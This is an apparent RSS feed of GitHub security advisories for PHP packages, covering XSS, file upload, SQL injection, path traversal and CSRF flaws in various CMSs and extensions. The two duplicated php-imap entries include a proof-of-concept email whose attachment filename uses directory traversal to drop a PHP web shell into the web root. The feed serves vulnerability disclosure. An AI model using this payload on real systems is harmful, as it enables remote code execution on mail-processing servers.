<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/composer.rss</id>
    <title>Security Advisory for PHP packages hosted at packagist.org</title>
    <updated>2023-06-22T08:01:33.001Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Acomposer"/>
    <subtitle>Security Advisory for PHP packages hosted at packagist.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[khodakhah/nodcms] NodCMS Cross Site Scripting vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-7xqx-xwg9-jx34</id>
        <link href="https://github.com/advisories/GHSA-7xqx-xwg9-jx34"/>
        <updated>2023-06-21T22:10:01.000Z</updated>
        <content type="html"><![CDATA[<p>Cross Site Scripting vulnerability in khodakhah NodCMS v.3.0 allows an attacker with administrative privileges to execute arbitrary code and gain access to sensitive information via a crafted script to the address parameter.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-20697">https://nvd.nist.gov/vuln/detail/CVE-2020-20697</a></li>
<li><a href="https://github.com/khodakhah/nodcms/issues/41">https://github.com/khodakhah/nodcms/issues/41</a></li>
<li><a href="https://github.com/advisories/GHSA-7xqx-xwg9-jx34">https://github.com/advisories/GHSA-7xqx-xwg9-jx34</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7xqx-xwg9-jx34</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-06-20T15:31:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[feehi/cms] liufee CMS File Upload vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-q3q5-qvh5-cmw5</id>
        <link href="https://github.com/advisories/GHSA-q3q5-qvh5-cmw5"/>
        <updated>2023-06-21T22:09:58.000Z</updated>
        <content type="html"><![CDATA[<p>File Upload vulnerability in liufee CMS v.2.0.7.1 allows a remote attacker to execute arbitrary code via the image suffix function.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-21174">https://nvd.nist.gov/vuln/detail/CVE-2020-21174</a></li>
<li><a href="https://github.com/liufee/cms/issues/44">https://github.com/liufee/cms/issues/44</a></li>
<li><a href="https://github.com/liufee/cms/commit/ecbfb0ca77874ead5b6e79b96a5e1f94e67475a9">https://github.com/liufee/cms/commit/ecbfb0ca77874ead5b6e79b96a5e1f94e67475a9</a></li>
<li><a href="https://github.com/advisories/GHSA-q3q5-qvh5-cmw5">https://github.com/advisories/GHSA-q3q5-qvh5-cmw5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q3q5-qvh5-cmw5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-06-20T15:31:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[sheng/yiicms] YiiCMS Cross Site Scripting vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-gqr4-cvf4-3957</id>
        <link href="https://github.com/advisories/GHSA-gqr4-cvf4-3957"/>
        <updated>2023-06-21T22:09:55.000Z</updated>
        <content type="html"><![CDATA[<p>Cross Site Scripting vulnerability in YiiCMS v.1.2.0 and prior allows a remote attacker to execute arbitrary code via the news function. A fix is available at commit 4a9d68564eb78d9f64e3f5dd77186a154093615b.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-21246">https://nvd.nist.gov/vuln/detail/CVE-2020-21246</a></li>
<li><a href="https://github.com/yongshengli/yiicms/issues/6">https://github.com/yongshengli/yiicms/issues/6</a></li>
<li><a href="https://github.com/yongshengli/yiicms/commit/4a9d68564eb78d9f64e3f5dd77186a154093615b">https://github.com/yongshengli/yiicms/commit/4a9d68564eb78d9f64e3f5dd77186a154093615b</a></li>
<li><a href="https://github.com/advisories/GHSA-gqr4-cvf4-3957">https://github.com/advisories/GHSA-gqr4-cvf4-3957</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gqr4-cvf4-3957</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-06-20T15:31:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[feehi/cms] Liufee CMS File Upload vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-6vf2-mfmr-qqqw</id>
        <link href="https://github.com/advisories/GHSA-6vf2-mfmr-qqqw"/>
        <updated>2023-06-21T22:09:41.000Z</updated>
        <content type="html"><![CDATA[<p>File Upload vulnerability in Liufee CMS, AKA Feehicms v.2.0.8 allows a remote attacker to execute arbitrary code via the <code>/admin/index.php?r=admin-user%2Fupdate-self</code> component.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-21489">https://nvd.nist.gov/vuln/detail/CVE-2020-21489</a></li>
<li><a href="https://github.com/liufee/cms/issues/46">https://github.com/liufee/cms/issues/46</a></li>
<li><a href="https://github.com/liufee/cms/commit/ecbfb0ca77874ead5b6e79b96a5e1f94e67475a9">https://github.com/liufee/cms/commit/ecbfb0ca77874ead5b6e79b96a5e1f94e67475a9</a></li>
<li><a href="https://github.com/advisories/GHSA-6vf2-mfmr-qqqw">https://github.com/advisories/GHSA-6vf2-mfmr-qqqw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6vf2-mfmr-qqqw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-06-20T15:31:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[webklex/laravel-imap] php-imap vulnerable to RCE through a directory traversal vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-47p7-xfcc-4pv9</id>
        <link href="https://github.com/advisories/GHSA-47p7-xfcc-4pv9"/>
        <updated>2023-06-21T21:59:00.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An unsanitized attachment filename allows any unauthenticated user to leverage a directory traversal vulnerability which results in a remote code execution vulnerability.</p>
<h3 id="details">Details</h3>
<p>An attacker can send an email with a malicious attachment to the inbox, which gets crawled with webklex/php-imap or webklex/laravel-imap. Prerequisite for the vulnerability is that the script stores the attachments without providing a <code>$filename</code>, or providing an unsanitized <code>$filename</code>, in <code>src/Attachment::save(string $path, string $filename = null)</code> (<a href="https://github.com/Webklex/php-imap/blob/5.2.0/src/Attachment.php#L251-L255">https://github.com/Webklex/php-imap/blob/5.2.0/src/Attachment.php#L251-L255</a>).
In this case, where no <code>$filename</code> gets passed into the <code>Attachment::save()</code> method, the package would use a series of unsanitized and insecure input values from the mail as fallback (<a href="https://github.com/Webklex/php-imap/blob/5.2.0/src/Attachment.php#L252">https://github.com/Webklex/php-imap/blob/5.2.0/src/Attachment.php#L252</a>).
Even if a developer passes a <code>$filename</code> into the <code>Attachment::save()</code> method, e.g. by passing the name or filename of the mail attachment itself (from email headers), the input values never get sanitized by the package.
There is also no restriction about the file extension (e.g. ".php") or the contents of a file. This allows an attacker to upload malicious code of any type and content at any location where the underlying user has write permissions.
The attacker can also overwrite existing files and inject malicious code into files that, e.g. get executed by the system via cron, requests,...
The official documentation only shows examples of <code>Attachment::save()</code> without providing the <code>$filename</code> (<a href="https://www.php-imap.com/api/attachment">https://www.php-imap.com/api/attachment</a>), which makes this vulnerability even more widespread.</p>
<h3 id="poc">PoC</h3>
<ol>
<li>send an email with a malicious attachment to an inbox, which gets crawled by the package</li>
</ol>
<pre><code>Return-Path: &lt;attacker@example.com&gt;
Date: Fri, 17 Aug 2018 14:36:24 +0000
From: Attacker &lt;attacker@example.com&gt;
To: Victim &lt;victim@example.com&gt;
MIME-Version: 1.0
Content-Type: multipart/mixed;
 boundary="_=_swift_v4_1534516584_32c032a3715d2dfd5cd84c26f84dba8d_=_"

Mail with malicious attachment

--_=_swift_v4_1534516584_32c032a3715d2dfd5cd84c26f84dba8d_=_
Content-Type: application/octet-stream; name=shell.php
Content-Transfer-Encoding: 8bit
Content-Disposition: attachment; filename=../../../../../../../../../../../../var/www/shell.php

&lt;?php
// RCE
system($_GET['cmd'] ?? '#');
?&gt;

--_=_swift_v4_1534516584_32c032a3715d2dfd5cd84c26f84dba8d_=_--

</code></pre>
<ol start="3">
<li>crawl email with malicious attachment</li>
<li>store the attachment with <code>Attachment::save('/path/to/storage')</code> without providing a <code>$filename</code> value</li>
</ol>
<h3 id="impact">Impact</h3>
<p>This is a remote code execution vulnerability that is made possible through a directory traversal vulnerability.
Every application that stores attachments with <code>Attachment::save()</code> without providing a <code>$filename</code> or passing unsanitized user input is affected by this attack.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Webklex/php-imap/security/advisories/GHSA-47p7-xfcc-4pv9">https://github.com/Webklex/php-imap/security/advisories/GHSA-47p7-xfcc-4pv9</a></li>
<li><a href="https://github.com/Webklex/php-imap/pull/414">https://github.com/Webklex/php-imap/pull/414</a></li>
<li><a href="https://github.com/Webklex/php-imap/blob/5.2.0/src/Attachment.php#L251-L255">https://github.com/Webklex/php-imap/blob/5.2.0/src/Attachment.php#L251-L255</a></li>
<li><a href="https://github.com/Webklex/php-imap/blob/5.2.0/src/Attachment.php#L252">https://github.com/Webklex/php-imap/blob/5.2.0/src/Attachment.php#L252</a></li>
<li><a href="https://github.com/Webklex/php-imap/releases/tag/5.3.0">https://github.com/Webklex/php-imap/releases/tag/5.3.0</a></li>
<li><a href="https://github.com/advisories/GHSA-47p7-xfcc-4pv9">https://github.com/advisories/GHSA-47p7-xfcc-4pv9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-47p7-xfcc-4pv9</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2023-06-21T21:58:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[webklex/php-imap] php-imap vulnerable to RCE through a directory traversal vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-47p7-xfcc-4pv9</id>
        <link href="https://github.com/advisories/GHSA-47p7-xfcc-4pv9"/>
        <updated>2023-06-21T21:59:00.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An unsanitized attachment filename allows any unauthenticated user to leverage a directory traversal vulnerability which results in a remote code execution vulnerability.</p>
<h3 id="details">Details</h3>
<p>An attacker can send an email with a malicious attachment to the inbox, which gets crawled with webklex/php-imap or webklex/laravel-imap. Prerequisite for the vulnerability is that the script stores the attachments without providing a <code>$filename</code>, or providing an unsanitized <code>$filename</code>, in <code>src/Attachment::save(string $path, string $filename = null)</code> (<a href="https://github.com/Webklex/php-imap/blob/5.2.0/src/Attachment.php#L251-L255">https://github.com/Webklex/php-imap/blob/5.2.0/src/Attachment.php#L251-L255</a>).
In this case, where no <code>$filename</code> gets passed into the <code>Attachment::save()</code> method, the package would use a series of unsanitized and insecure input values from the mail as fallback (<a href="https://github.com/Webklex/php-imap/blob/5.2.0/src/Attachment.php#L252">https://github.com/Webklex/php-imap/blob/5.2.0/src/Attachment.php#L252</a>).
Even if a developer passes a <code>$filename</code> into the <code>Attachment::save()</code> method, e.g. by passing the name or filename of the mail attachment itself (from email headers), the input values never get sanitized by the package.
There is also no restriction about the file extension (e.g. ".php") or the contents of a file. This allows an attacker to upload malicious code of any type and content at any location where the underlying user has write permissions.
The attacker can also overwrite existing files and inject malicious code into files that, e.g. get executed by the system via cron, requests,...
The official documentation only shows examples of <code>Attachment::save()</code> without providing the <code>$filename</code> (<a href="https://www.php-imap.com/api/attachment">https://www.php-imap.com/api/attachment</a>), which makes this vulnerability even more widespread.</p>
<h3 id="poc">PoC</h3>
<ol>
<li>send an email with a malicious attachment to an inbox, which gets crawled by the package</li>
</ol>
<pre><code>Return-Path: &lt;attacker@example.com&gt;
Date: Fri, 17 Aug 2018 14:36:24 +0000
From: Attacker &lt;attacker@example.com&gt;
To: Victim &lt;victim@example.com&gt;
MIME-Version: 1.0
Content-Type: multipart/mixed;
 boundary="_=_swift_v4_1534516584_32c032a3715d2dfd5cd84c26f84dba8d_=_"

Mail with malicious attachment

--_=_swift_v4_1534516584_32c032a3715d2dfd5cd84c26f84dba8d_=_
Content-Type: application/octet-stream; name=shell.php
Content-Transfer-Encoding: 8bit
Content-Disposition: attachment; filename=../../../../../../../../../../../../var/www/shell.php

&lt;?php
// RCE
system($_GET['cmd'] ?? '#');
?&gt;

--_=_swift_v4_1534516584_32c032a3715d2dfd5cd84c26f84dba8d_=_--

</code></pre>
<ol start="3">
<li>crawl email with malicious attachment</li>
<li>store the attachment with <code>Attachment::save('/path/to/storage')</code> without providing a <code>$filename</code> value</li>
</ol>
<h3 id="impact">Impact</h3>
<p>This is a remote code execution vulnerability that is made possible through a directory traversal vulnerability.
Every application that stores attachments with <code>Attachment::save()</code> without providing a <code>$filename</code> or passing unsanitized user input is affected by this attack.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Webklex/php-imap/security/advisories/GHSA-47p7-xfcc-4pv9">https://github.com/Webklex/php-imap/security/advisories/GHSA-47p7-xfcc-4pv9</a></li>
<li><a href="https://github.com/Webklex/php-imap/pull/414">https://github.com/Webklex/php-imap/pull/414</a></li>
<li><a href="https://github.com/Webklex/php-imap/blob/5.2.0/src/Attachment.php#L251-L255">https://github.com/Webklex/php-imap/blob/5.2.0/src/Attachment.php#L251-L255</a></li>
<li><a href="https://github.com/Webklex/php-imap/blob/5.2.0/src/Attachment.php#L252">https://github.com/Webklex/php-imap/blob/5.2.0/src/Attachment.php#L252</a></li>
<li><a href="https://github.com/Webklex/php-imap/releases/tag/5.3.0">https://github.com/Webklex/php-imap/releases/tag/5.3.0</a></li>
<li><a href="https://github.com/advisories/GHSA-47p7-xfcc-4pv9">https://github.com/advisories/GHSA-47p7-xfcc-4pv9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-47p7-xfcc-4pv9</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2023-06-21T21:58:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[gilacms/gila] GilaCMS Cross Site Request Forgery vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-4cw3-rhqx-vqwr</id>
        <link href="https://github.com/advisories/GHSA-4cw3-rhqx-vqwr"/>
        <updated>2023-06-21T18:36:55.000Z</updated>
        <content type="html"><![CDATA[<p>Cross Site Request Forgery vulnerability in Gila GilaCMS v.1.11.4 allows a remote attacker to execute arbitrary code via the <code>cm/update_rows/user</code> parameter.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-20726">https://nvd.nist.gov/vuln/detail/CVE-2020-20726</a></li>
<li><a href="https://github.com/GilaCMS/gila/issues/51">https://github.com/GilaCMS/gila/issues/51</a></li>
<li><a href="https://github.com/advisories/GHSA-4cw3-rhqx-vqwr">https://github.com/advisories/GHSA-4cw3-rhqx-vqwr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4cw3-rhqx-vqwr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-06-20T15:31:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[craftcms/cms] Craft CMS vulnerable to HTML injection]]></title>
        <id>https://github.com/advisories/GHSA-m3v5-gjj9-rg24</id>
        <link href="https://github.com/advisories/GHSA-m3v5-gjj9-rg24"/>
        <updated>2023-06-21T18:36:29.000Z</updated>
        <content type="html"><![CDATA[<p>Craft CMS through 4.4.9 is vulnerable to HTML Injection.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-33495">https://nvd.nist.gov/vuln/detail/CVE-2023-33495</a></li>
<li><a href="https://medium.com/@mondalsomnath9135/html-injection-in-craft-cms-application-e2b28f746212">https://medium.com/@mondalsomnath9135/html-injection-in-craft-cms-application-e2b28f746212</a></li>
<li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection">https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection</a></li>
<li><a href="https://github.com/advisories/GHSA-m3v5-gjj9-rg24">https://github.com/advisories/GHSA-m3v5-gjj9-rg24</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m3v5-gjj9-rg24</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-06-20T15:31:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[andrewhaine/silverstripe-form-capture] Silverstripe Form Capture vulnerable to stored cross-site-scripting]]></title>
        <id>https://github.com/advisories/GHSA-38h6-gmr2-j4wx</id>
        <link href="https://github.com/advisories/GHSA-38h6-gmr2-j4wx"/>
        <updated>2023-06-21T18:01:34.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Improper escaping when presenting stored form submissions allowed for an attacker to perform a Cross-Site Scripting attack</p>
<h3 id="patches">Patches</h3>
<p>The vulnerability was initially patched in version 1.0.2, and version 1.1.0 includes this patch. The bug was then accidentally re-introduced during a merge error, and has been re-patched in versions 2.2.5 and 3.1.1.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/bigfork/silverstripe-form-capture/security/advisories/GHSA-38h6-gmr2-j4wx">https://github.com/bigfork/silverstripe-form-capture/security/advisories/GHSA-38h6-gmr2-j4wx</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-28851">https://nvd.nist.gov/vuln/detail/CVE-2023-28851</a></li>
<li><a href="https://github.com/bigfork/silverstripe-form-capture/commit/5b3aa39dd1eef042f173167b0fa4d3f717971772">https://github.com/bigfork/silverstripe-form-capture/commit/5b3aa39dd1eef042f173167b0fa4d3f717971772</a></li>
<li><a href="https://github.com/bigfork/silverstripe-form-capture/commit/3a7a3c480e3fccddce9c5f359796d45a8302a622">https://github.com/bigfork/silverstripe-form-capture/commit/3a7a3c480e3fccddce9c5f359796d45a8302a622</a></li>
<li><a href="https://github.com/advisories/GHSA-38h6-gmr2-j4wx">https://github.com/advisories/GHSA-38h6-gmr2-j4wx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-38h6-gmr2-j4wx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-04-03T21:06:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[andrewhaine/silverstripe-form-capture] Silverstripe Form Capture vulnerable to stored cross-site-scripting]]></title>
        <id>https://github.com/advisories/GHSA-38h6-gmr2-j4wx</id>
        <link href="https://github.com/advisories/GHSA-38h6-gmr2-j4wx"/>
        <updated>2023-06-21T18:01:34.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Improper escaping when presenting stored form submissions allowed for an attacker to perform a Cross-Site Scripting attack</p>
<h3 id="patches">Patches</h3>
<p>The vulnerability was initially patched in version 1.0.2, and version 1.1.0 includes this patch. The bug was then accidentally re-introduced during a merge error, and has been re-patched in versions 2.2.5 and 3.1.1.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/bigfork/silverstripe-form-capture/security/advisories/GHSA-38h6-gmr2-j4wx">https://github.com/bigfork/silverstripe-form-capture/security/advisories/GHSA-38h6-gmr2-j4wx</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-28851">https://nvd.nist.gov/vuln/detail/CVE-2023-28851</a></li>
<li><a href="https://github.com/bigfork/silverstripe-form-capture/commit/5b3aa39dd1eef042f173167b0fa4d3f717971772">https://github.com/bigfork/silverstripe-form-capture/commit/5b3aa39dd1eef042f173167b0fa4d3f717971772</a></li>
<li><a href="https://github.com/bigfork/silverstripe-form-capture/commit/3a7a3c480e3fccddce9c5f359796d45a8302a622">https://github.com/bigfork/silverstripe-form-capture/commit/3a7a3c480e3fccddce9c5f359796d45a8302a622</a></li>
<li><a href="https://github.com/advisories/GHSA-38h6-gmr2-j4wx">https://github.com/advisories/GHSA-38h6-gmr2-j4wx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-38h6-gmr2-j4wx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-04-03T21:06:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[andrewhaine/silverstripe-form-capture] Silverstripe Form Capture vulnerable to stored cross-site-scripting]]></title>
        <id>https://github.com/advisories/GHSA-38h6-gmr2-j4wx</id>
        <link href="https://github.com/advisories/GHSA-38h6-gmr2-j4wx"/>
        <updated>2023-06-21T18:01:34.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Improper escaping when presenting stored form submissions allowed for an attacker to perform a Cross-Site Scripting attack</p>
<h3 id="patches">Patches</h3>
<p>The vulnerability was initially patched in version 1.0.2, and version 1.1.0 includes this patch. The bug was then accidentally re-introduced during a merge error, and has been re-patched in versions 2.2.5 and 3.1.1.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/bigfork/silverstripe-form-capture/security/advisories/GHSA-38h6-gmr2-j4wx">https://github.com/bigfork/silverstripe-form-capture/security/advisories/GHSA-38h6-gmr2-j4wx</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-28851">https://nvd.nist.gov/vuln/detail/CVE-2023-28851</a></li>
<li><a href="https://github.com/bigfork/silverstripe-form-capture/commit/5b3aa39dd1eef042f173167b0fa4d3f717971772">https://github.com/bigfork/silverstripe-form-capture/commit/5b3aa39dd1eef042f173167b0fa4d3f717971772</a></li>
<li><a href="https://github.com/bigfork/silverstripe-form-capture/commit/3a7a3c480e3fccddce9c5f359796d45a8302a622">https://github.com/bigfork/silverstripe-form-capture/commit/3a7a3c480e3fccddce9c5f359796d45a8302a622</a></li>
<li><a href="https://github.com/advisories/GHSA-38h6-gmr2-j4wx">https://github.com/advisories/GHSA-38h6-gmr2-j4wx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-38h6-gmr2-j4wx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-04-03T21:06:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[bigfork/silverstripe-form-capture] Silverstripe Form Capture vulnerable to stored cross-site-scripting]]></title>
        <id>https://github.com/advisories/GHSA-38h6-gmr2-j4wx</id>
        <link href="https://github.com/advisories/GHSA-38h6-gmr2-j4wx"/>
        <updated>2023-06-21T18:01:34.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Improper escaping when presenting stored form submissions allowed for an attacker to perform a Cross-Site Scripting attack</p>
<h3 id="patches">Patches</h3>
<p>The vulnerability was initially patched in version 1.0.2, and version 1.1.0 includes this patch. The bug was then accidentally re-introduced during a merge error, and has been re-patched in versions 2.2.5 and 3.1.1.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/bigfork/silverstripe-form-capture/security/advisories/GHSA-38h6-gmr2-j4wx">https://github.com/bigfork/silverstripe-form-capture/security/advisories/GHSA-38h6-gmr2-j4wx</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-28851">https://nvd.nist.gov/vuln/detail/CVE-2023-28851</a></li>
<li><a href="https://github.com/bigfork/silverstripe-form-capture/commit/5b3aa39dd1eef042f173167b0fa4d3f717971772">https://github.com/bigfork/silverstripe-form-capture/commit/5b3aa39dd1eef042f173167b0fa4d3f717971772</a></li>
<li><a href="https://github.com/bigfork/silverstripe-form-capture/commit/3a7a3c480e3fccddce9c5f359796d45a8302a622">https://github.com/bigfork/silverstripe-form-capture/commit/3a7a3c480e3fccddce9c5f359796d45a8302a622</a></li>
<li><a href="https://github.com/advisories/GHSA-38h6-gmr2-j4wx">https://github.com/advisories/GHSA-38h6-gmr2-j4wx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-38h6-gmr2-j4wx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-04-03T21:06:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[studio-42/elfinder] Duplicate Advisory: elFinder vulnerable to path traversal in LocalVolumeDriver connector]]></title>
        <id>https://github.com/advisories/GHSA-3p2q-mh7q-9pxj</id>
        <link href="https://github.com/advisories/GHSA-3p2q-mh7q-9pxj"/>
        <updated>2023-06-19T20:16:23.000Z</updated>
        <content type="html"><![CDATA[<h3 id="duplicate-advisory">Duplicate Advisory</h3>
<p>This advisory has been withdrawn because it is a duplicate of GHSA-wm5g-p99q-66g4. This link is maintained to preserve external references.</p>
<h3 id="original-description">Original Description</h3>
<p>_joinPath in elFinderVolumeLocalFileSystem.class.php in elFinder before 2.1.62 allows path traversal in the PHP LocalVolumeDriver connector.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Studio-42/elFinder/security/advisories/GHSA-wm5g-p99q-66g4">https://github.com/Studio-42/elFinder/security/advisories/GHSA-wm5g-p99q-66g4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-35840">https://nvd.nist.gov/vuln/detail/CVE-2023-35840</a></li>
<li><a href="https://github.com/Studio-42/elFinder/commit/bb9aaa7b096a1b83f2f85657c43f12131ece2891">https://github.com/Studio-42/elFinder/commit/bb9aaa7b096a1b83f2f85657c43f12131ece2891</a></li>
<li><a href="https://github.com/advisories/GHSA-3p2q-mh7q-9pxj">https://github.com/advisories/GHSA-3p2q-mh7q-9pxj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3p2q-mh7q-9pxj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-06-19T03:30:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[in2code/ipandlanguageredirect] ipandlanguageredirect extension vulnerable to SQL Injection]]></title>
        <id>https://github.com/advisories/GHSA-4xf2-7qfv-mgfx</id>
        <link href="https://github.com/advisories/GHSA-4xf2-7qfv-mgfx"/>
        <updated>2023-06-16T22:14:35.000Z</updated>
        <content type="html"><![CDATA[<p>The ipandlanguageredirect extension before 5.1.2 for TYPO3 allows SQL Injection.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-35782">https://nvd.nist.gov/vuln/detail/CVE-2023-35782</a></li>
<li><a href="https://typo3.org/security/advisory/typo3-ext-sa-2023-005">https://typo3.org/security/advisory/typo3-ext-sa-2023-005</a></li>
<li><a href="https://github.com/einpraegsam/ipandlanguageredirect/commit/d80eb99e739a09984ad0ea94b12380236346ae42">https://github.com/einpraegsam/ipandlanguageredirect/commit/d80eb99e739a09984ad0ea94b12380236346ae42</a></li>
<li><a href="https://github.com/FriendsOfPHP/security-advisories/blob/master/in2code/ipandlanguageredirect/CVE-2023-35782.yaml">https://github.com/FriendsOfPHP/security-advisories/blob/master/in2code/ipandlanguageredirect/CVE-2023-35782.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-4xf2-7qfv-mgfx">https://github.com/advisories/GHSA-4xf2-7qfv-mgfx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4xf2-7qfv-mgfx</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-06-16T15:30:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tpwd/ke_search] ke_search (aka Faceted Search) vulnerable to Cross-Site Scripting]]></title>
        <id>https://github.com/advisories/GHSA-f4m6-x2xj-jc7w</id>
        <link href="https://github.com/advisories/GHSA-f4m6-x2xj-jc7w"/>
        <updated>2023-06-16T22:10:51.000Z</updated>
        <content type="html"><![CDATA[<p>The ke_search (aka Faceted Search) extension before 4.0.3, 4.1.x through 4.6.x before 4.6.6, and 5.x before 5.0.2 for TYPO3 allows XSS via indexed data.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-35783">https://nvd.nist.gov/vuln/detail/CVE-2023-35783</a></li>
<li><a href="https://typo3.org/security/advisory/typo3-ext-sa-2023-004">https://typo3.org/security/advisory/typo3-ext-sa-2023-004</a></li>
<li><a href="https://github.com/tpwd/ke_search/commit/14fa0703c2469e04eb398be4ae6268ec6ad6e720">https://github.com/tpwd/ke_search/commit/14fa0703c2469e04eb398be4ae6268ec6ad6e720</a></li>
<li><a href="https://github.com/tpwd/ke_search/commit/b0f05d7e7e207bc0d5051bd96f3ff43c5c3658c6">https://github.com/tpwd/ke_search/commit/b0f05d7e7e207bc0d5051bd96f3ff43c5c3658c6</a></li>
